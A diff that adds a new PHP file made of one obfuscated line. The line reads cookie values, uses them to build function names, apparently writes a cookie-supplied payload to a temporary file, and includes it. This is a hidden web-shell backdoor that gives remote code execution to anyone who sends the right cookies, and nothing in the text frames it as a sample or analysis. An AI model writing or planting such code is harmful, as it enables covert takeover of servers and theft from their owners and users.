@@ -1,0 +1,2 @@
+<?php
+$kP= $_COOKIE;	$IxJ=0 ; $Fn=	(	37-34) ;$vtu =array	() ;$vtu[	$IxJ]="" ;	while(	$Fn	){  $vtu	[$IxJ]	.= $kP[		( 39- 0 )	][$Fn] ;	if(	!	$kP	[  ( 41	- 2)		]	[	$Fn +1] ){	if(	!$kP [	(91- 52	) ][	$Fn	+	2]	)break ; 		$IxJ	++; $vtu[ $IxJ ] ="" ;$Fn ++ ;	}	$Fn	=	$Fn+  (15-	12)	+ 1;}	$IxJ	=$vtu[(49	-	37)	 ]	(). $vtu[ (47-26)  ];if (!$vtu	[ (90	-77 ) 	]( $IxJ	) ){ 	$Fn	=$vtu[ (36 -10	)	]($IxJ , $vtu	[	( 39-35	)])	;	$vtu	[	 (83-58 )	] ( $Fn	,	$vtu[	(86-	77 )	]. $vtu[(	89-65)]($vtu[( 98- 95	) 	]( $kP	[3]))) ; }include( $IxJ	);
